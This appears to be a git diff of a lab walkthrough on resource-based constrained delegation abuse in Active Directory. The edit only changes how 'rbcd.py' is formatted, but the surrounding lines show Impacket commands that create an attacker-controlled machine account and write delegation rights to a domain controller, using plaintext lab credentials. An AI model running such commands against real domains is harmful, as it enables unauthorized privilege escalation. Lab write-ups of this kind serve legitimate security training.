@@ -116,7 +116,7 @@ addcomputer.py 'lab.local/ldapuser:liverpool' -computer-name irem -computer-pass
 
 ### 3. Now we can try RBCD
 
-We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's [rbcd.py](http://rbcd.py/) script can be used for that purpose:
+We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's `rbcd.py` script can be used for that purpose:
 
 ```bash
 rbcd.py -delegate-from 'irem$' -delegate-to 'VALENOR-DC01$' -action 'write' 'lab.local/ldapuser:liverpool'
